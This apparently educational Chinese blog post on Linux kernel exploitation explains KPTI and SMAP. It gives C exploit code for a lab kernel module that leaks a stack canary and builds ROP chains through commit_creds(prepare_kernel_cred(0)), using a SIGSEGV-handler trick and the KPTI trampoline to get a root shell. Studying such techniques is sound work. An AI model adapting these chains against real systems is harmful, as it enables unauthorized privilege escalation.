---
layout: post
tags: [kernel_pwn]
title: "kernel stack 3: canary+smep+kpti绕过"
author: wsxk
date: 2026-9-25
comments: true
---


- [6. canary+smep+kpti: ROP](#6-canarysmepkpti-rop)
  - [6.1 kpti的原理](#61-kpti的原理)
  - [6.2 设置signal handler + ROP 绕过](#62-设置signal-handler--rop-绕过)
  - [6.3 KPTI trampoline + ROP](#63-kpti-trampoline--rop)
- [7. canary+smep+kpti+smap: ROP](#7-canarysmepkptismap-rop)
  - [7.1 SMAP原理](#71-smap原理)
  - [7.2 KPTI trampoline + ROP](#72-kpti-trampoline--rop)
- [references](#references)


# 6. canary+smep+kpti: ROP<br>
## 6.1 kpti的原理<br>
kpti诞生是为了阻止meltdown漏洞的，核心原理是维护两套页表：一套跟之前一样，有用户态和内核态全量地址的映射，供内核态使用，**但是将用户态地址空间标记为不可执行**；另一套有用户态全量地址和必要的内核态地址（最小集），供用户态使用。在kpti开启时，在发生系统调用时，会发生页表的切换。<br>
`CR(control register)3寄存器`即页表的物理地址。<br>

启动命令:<br>
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,-smap \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 nokaslr kpti=1 quiet panic=1" \
    -s
```

## 6.2 设置signal handler + ROP 绕过<br>
这是一个非常有意思的机制。<br>
这其实是利用了**触发signal自动切换cr3寄存器的机制，另外触发page fault时，也不会保存当前cr3寄存器用于回复**。<br>
```
             内核态
        CR3 = kernel CR3
              │
              │ 忘记 SWITCH_TO_USER_CR3
              ▼
            iretq
              │
              ▼
        CS=0x33 / CPL=3
        RIP=用户代码地址
        CR3=kernel CR3   ← 错误
              │
              │ 取用户指令
              ▼
     kernel CR3 用户区域 NX
              │
              ▼
             #PF
              │
              ▼
        进入 Page Fault
              ↓
        内核异常入口
              ↓
        发现已经是 kernel CR3
              ↓
        保持 kernel CR3
              ↓
        处理 page fault,因为CS & 3 == 3，Linux 会把它当成用户态 page fault。如果无法正常解决这个 execute fault，就可以产生：SIGSEGV
        处理 SIGSEGV
              ↓
          建立 signal frame
              ↓
          pt_regs.RIP = func
              ↓
          swapgs_restore_regs_and_return_to_usermode
              ↓
          SWITCH_TO_USER_CR3
              ↓
          CR3 = user CR3
              ↓
          iretq
              ↓
          CPL3
              ↓
          func()
```
借用signal的处理机制，反而帮助我们还原了用户态的cr3存放的页表:<br>
```c
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;
unsigned long mov_esp_pop_r12_pop_rbp_ret = 0xffffffff8196f56a;
unsigned long * fake_stack;
int main(){
    // step 0 : save status
    save_status();
    // set signal handler
    signal(SIGSEGV, get_root_shell);
    int fd =open_device();
    // step 1: leak the canary
    unsigned long tmp_buf[50];
    unsigned long size=0x8*50;
    read(fd,tmp_buf,size);
    unsigned long canary = tmp_buf[16];
    printf("canary: 0x%llx\n",canary);

    // step 2: construct fake stack
    fake_stack = mmap(0x5b000000-0x1000, 0x2000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,0);
    int off = 0x1000/8;
    fake_stack[0] = 0xdeadbeef;
    fake_stack[off++] = 0;
    fake_stack[off++] = 0;
    fake_stack[off++] = pop_rdi_ret;
    fake_stack[off++] = 0;
    fake_stack[off++] = prepare_kernel_cred;
    fake_stack[off++] = cmp_esi_esi_ret;
    fake_stack[off++] = mov_rdi_rax_ja_pop_rbp_ret;
    fake_stack[off++] = 0 ;
    fake_stack[off++] = commit_creds;
    fake_stack[off++] = swapgs_pop_rbp_ret;
    fake_stack[off++] = 0; 
    fake_stack[off++] = iretq;
    fake_stack[off++] = (unsigned long )get_root_shell;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;
    // step 3: construct the payload
    off = 17;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = mov_esp_pop_r12_pop_rbp_ret;
    write(fd,tmp_buf,size);    
}
```

## 6.3 KPTI trampoline + ROP<br>
绕过方法其实还是ROP，但是因为需要切换页表，我们不知道切换页表要做什么，但是考虑到执行syscall能正常返回，内核里一定有一段关于内核页表切换的代码！<br>
代码位于`swapgs_restore_regs_and_return_to_usermode`中<br>
```bash
cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
```
其汇编代码如下:<br>
```asm
   0xffffffff81200f10 <_stext+2101008>:	pop    r15
   0xffffffff81200f12 <_stext+2101010>:	pop    r14
   0xffffffff81200f14 <_stext+2101012>:	pop    r13
   0xffffffff81200f16 <_stext+2101014>:	pop    r12
   0xffffffff81200f18 <_stext+2101016>:	pop    rbp
   0xffffffff81200f19 <_stext+2101017>:	pop    rbx
   0xffffffff81200f1a <_stext+2101018>:	pop    r11
   0xffffffff81200f1c <_stext+2101020>:	pop    r10
   0xffffffff81200f1e <_stext+2101022>:	pop    r9
   0xffffffff81200f20 <_stext+2101024>:	pop    r8
   0xffffffff81200f22 <_stext+2101026>:	pop    rax
   0xffffffff81200f23 <_stext+2101027>:	pop    rcx
   0xffffffff81200f24 <_stext+2101028>:	pop    rdx
   0xffffffff81200f25 <_stext+2101029>:	pop    rsi
   0xffffffff81200f26 <_stext+2101030>:	mov    rdi,rsp  //start here
   0xffffffff81200f29 <_stext+2101033>:	mov    rsp,QWORD PTR gs:0x6004
   0xffffffff81200f32 <_stext+2101042>:	push   QWORD PTR [rdi+0x30]
   0xffffffff81200f35 <_stext+2101045>:	push   QWORD PTR [rdi+0x28]
   0xffffffff81200f38 <_stext+2101048>:	push   QWORD PTR [rdi+0x20]
   0xffffffff81200f3b <_stext+2101051>:	push   QWORD PTR [rdi+0x18]
   0xffffffff81200f3e <_stext+2101054>:	push   QWORD PTR [rdi+0x10]
   0xffffffff81200f41 <_stext+2101057>:	push   QWORD PTR [rdi]
   0xffffffff81200f43 <_stext+2101059>:	push   rax
   0xffffffff81200f44 <_stext+2101060>:	xchg   ax,ax
   0xffffffff81200f46 <_stext+2101062>:	mov    rdi,cr3
   0xffffffff81200f49 <_stext+2101065>:	jmp    0xffffffff81200f7f <_stext+2101119>
   ... 
   0xffffffff81200f7f <_stext+2101119>:	or     rdi,0x1000
   0xffffffff81200f86 <_stext+2101126>:	mov    cr3,rdi
   0xffffffff81200f89 <_stext+2101129>:	pop    rax
   0xffffffff81200f8a <_stext+2101130>:	pop    rdi
   0xffffffff81200f8b <_stext+2101131>:	swapgs
   0xffffffff81200f8e <_stext+2101134>:	nop    DWORD PTR [rax]
   0xffffffff81200f91 <_stext+2101137>:	jmp    0xffffffff81200fc0 <_stext+2101184>
   ...
   0xffffffff81200fc0 <_stext+2101184>:	test   BYTE PTR [rsp+0x20],0x4
   0xffffffff81200fc5 <_stext+2101189>:	jne    0xffffffff81200fc9 <_stext+2101193>
   0xffffffff81200fc7 <_stext+2101191>:	iretq  //这里返回
```
而且 `trampoline`里自带了`swapgs`和`iretq`，还是比较方便的。<br>
```c
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;
unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10+22;
int main(){
    // step 0 : save status
    save_status();

    int fd =open_device();
    // step 1: leak the canary
    unsigned long tmp_buf[50];
    unsigned long size=0x8*50;
    read(fd,tmp_buf,size);
    unsigned long canary = tmp_buf[16];
    printf("canary: 0x%llx\n",canary);

    // step 2: construct the payload
    int off = 17;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = pop_rdi_ret;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = prepare_kernel_cred;
    tmp_buf[off++] = cmp_esi_esi_ret;
    tmp_buf[off++] = mov_rdi_rax_ja_pop_rbp_ret;
    tmp_buf[off++] = 0 ;
    tmp_buf[off++] = commit_creds;
    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
    tmp_buf[off++] = 0;  // padding
    tmp_buf[off++] = 0;  //padding
    tmp_buf[off++] = (unsigned long )get_root_shell;
    tmp_buf[off++] = user_cs;
    tmp_buf[off++] = user_rflags;
    tmp_buf[off++] = user_sp;
    tmp_buf[off++] = user_ss;
    write(fd,tmp_buf,size);   
}
```

# 7. canary+smep+kpti+smap: ROP<br>
## 7.1 SMAP原理<br>
SMAP本质上和SMEP类似，就是在**内核态时，用户态页表会被标记为不可读写。**<br>
可以通过设置内核的`CR(control register)4寄存器的第21位bit为1`来启动该特性。就在SMEP标志位的旁边<br>
qemu启动命令:<br>
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 nokaslr kpti=1 quiet panic=1" \
    -s
```
## 7.2 KPTI trampoline + ROP<br>
原先的代码原封不动就能用:<br>
```c
```c
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;
unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10+22;
int main(){
    // step 0 : save status
    save_status();

    int fd =open_device();
    // step 1: leak the canary
    unsigned long tmp_buf[50];
    unsigned long size=0x8*50;
    read(fd,tmp_buf,size);
    unsigned long canary = tmp_buf[16];
    printf("canary: 0x%llx\n",canary);

    // step 2: construct the payload
    int off = 17;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = pop_rdi_ret;
    tmp_buf[off++] = 0;
    tmp_buf[off++] = prepare_kernel_cred;
    tmp_buf[off++] = cmp_esi_esi_ret;
    tmp_buf[off++] = mov_rdi_rax_ja_pop_rbp_ret;
    tmp_buf[off++] = 0 ;
    tmp_buf[off++] = commit_creds;
    tmp_buf[off++] = swapgs_restore_regs_and_return_to_usermode;
    tmp_buf[off++] = 0;  // padding
    tmp_buf[off++] = 0;  //padding
    tmp_buf[off++] = (unsigned long )get_root_shell;
    tmp_buf[off++] = user_cs;
    tmp_buf[off++] = user_rflags;
    tmp_buf[off++] = user_sp;
    tmp_buf[off++] = user_ss;
    write(fd,tmp_buf,size);   
}
```
但是原本更复杂场景，栈迁移的技术就不可用了。<br>



# references<br>
[https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)<br>
[https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)<br>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>